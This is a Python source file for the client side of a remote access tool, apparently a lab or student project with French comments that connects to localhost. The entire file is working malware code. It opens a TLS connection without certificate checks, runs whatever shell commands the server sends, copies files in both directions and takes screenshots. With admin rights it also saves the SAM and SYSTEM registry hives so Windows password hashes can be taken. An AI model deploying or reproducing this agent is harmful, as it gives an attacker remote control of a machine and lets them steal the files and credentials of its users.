import socket
import ssl
import subprocess
import os
import ctypes
import time

from PIL import ImageGrab


def format_filename(commande):
    # remove only the first word
    file_path = commande.split(" ", 1)[1]
    file_path = file_path.replace('"', '')
    if '/' in file_path:
        return file_path.split("/")[-1], file_path
    elif '\\' in file_path:
        return file_path.split("\\")[-1], file_path
    else:
        return file_path, file_path


def is_admin():
    try:
        # Utiliser l'API Windows pour vérifier si le processus actuel est exécuté avec des privilèges administratifs
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def upload_feature(filename, conn):
    print(f"Downloading {filename}...")

    # Recevoir la taille du fichier (8 octets)
    file_size = int.from_bytes(conn.recv(8), 'big')
    # print(f"Expected file size: {file_size} bytes")

    # Recevoir le fichier en morceaux de 1024 octets
    with open(filename, "wb") as file:
        received = 0
        while received < file_size:
            chunk = conn.recv(min(1024, file_size - received))
            if not chunk:
                raise EOFError('Connection closed before receiving all the data')
            file.write(chunk)
            received += len(chunk)
            # calculate progress
            progress = str(round(((received / file_size) * 100)))
            conn.send(progress.encode('utf-8'))

    print("File uploaded successfully")
    conn.send(b"\nFile uploaded successfully")


def download_feature(file_path, conn):
    print(f"Uploading {file_path}...")

    # check if file exist and is readable
    if os.path.exists(file_path) and os.access(file_path, os.R_OK):
        print(f"File {file_path} exist")
        conn.send(b"File OK")

        # Send the file size (8 bytes)
        file_size = os.path.getsize(file_path)
        conn.send(file_size.to_bytes(8, 'big'))
        # print(f"Sent file size: {file_size} bytes")

        # Send the file in chunks of 1024 bytes
        with open(file_path, "rb") as file:
            while chunk := file.read(1024):
                conn.send(chunk)

        conn.send(b"\nFile uploaded successfully")
        print("File uploaded successfully")

    else:
        print(f"The file {file_path} doesn't exist or is not readable.")
        conn.send(b"File not found")
        conn.send(b"The file doesn't exist or is not readable.")


def take_screenshot(display):
    if display is not None:
        # display = display.replace(":", "")
        print(f"display = {display}")
        screenshot = ImageGrab.grab(xdisplay=display)
    else:
        screenshot = ImageGrab.grab()

    screenshot.save("screenshot.png")
    screenshot.close()


def screenshot_manager(conn):
    print("Taking screenshot...")

    if os.name == "nt":
        # Windows
        take_screenshot(None)
        conn.send(b"ok")
        download_feature("screenshot.png", conn)
    else:
        # Linux
        display_configured = subprocess.getoutput("echo $DISPLAY")
        if display_configured == "":
            print("No display configured")
            conn.send(b"NOK")
            conn.send(b"[-] No display detected on client")
        else:
            take_screenshot(display_configured)
            conn.send(b"ok")
            download_feature("screenshot.png", conn)


def connect_to_server():
    context = ssl.create_default_context()
    context.check_hostname = False  # Désactiver la vérification du nom d'hôte
    context.verify_mode = ssl.CERT_NONE  # Désactiver la vérification du certificat

    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = context.wrap_socket(conn, server_hostname='localhost')  # Envelopper le socket avec SSL
    conn.connect(('localhost', 1234))

    # get on which OS the client is running
    conn.send(os.name.encode('utf-8'))

    while True:
        command = conn.recv(1024).decode('utf-8')

        if command.lower() == "close":
            break

        elif command.lower() == "hashdump windows":
            print("Hashdump Windows")
            # check if the client is running on elevated privileges
            if not is_admin():
                conn.send("The client is not running with elevated privileges".encode('utf-8'))
                continue
            else:
                conn.send("OK".encode('utf-8'))
                # delete the files if they exist
                if os.path.exists("sam_registry"):
                    os.remove("sam_registry")
                    print("sam_registry deleted")

                if os.path.exists("system_registry"):
                    os.remove("system_registry")
                    print("system_registry deleted")

                # save the registry hives
                subprocess.getoutput("reg save hklm\\sam sam_registry")
                subprocess.getoutput("reg save hklm\\system system_registry")

                # send the files
                download_feature("sam_registry", conn)
                time.sleep(1)
                download_feature("system_registry", conn)


        # UPLOAD FILE command
        elif command.lower().startswith("upload"):
            # format filename
            filename, file_path = format_filename(command.lower())

            # send the command
            upload_feature(filename, conn)

        # DONWLOAD FILE command
        elif command.lower().startswith("download"):
            # format filename
            filename, file_path = format_filename(command.lower())

            # send the command
            download_feature(file_path, conn)

        elif command.lower() == "screenshot":
            screenshot_manager(conn)

        elif command.lower() == "shell":
            print("Shell opened")

            while True:
                command = conn.recv(1024).decode('utf-8')
                print(command)

                if command.startswith("cd"):
                    try:
                        new_path = command.split(" ")[1]
                        if not os.path.exists(new_path):
                            conn.send("Directory does not exist".encode('utf-8'))
                        else:
                            os.chdir(command.split(" ")[1])
                            conn.send("Directory changed".encode('utf-8'))
                    except IndexError:
                        conn.send("No directory specified".encode('utf-8'))
                        continue
                    continue

                if command.lower() == "exit":
                    conn.send("End of Shell.".encode('utf-8'))
                    break

                output = subprocess.getoutput(command)
                if not output:
                    output = "No output"
                conn.send(output.encode('utf-8'))

        else:
            output = subprocess.getoutput(command.lower())
            conn.send(output.encode('utf-8'))

    conn.close()


if __name__ == "__main__":
    connect_to_server()
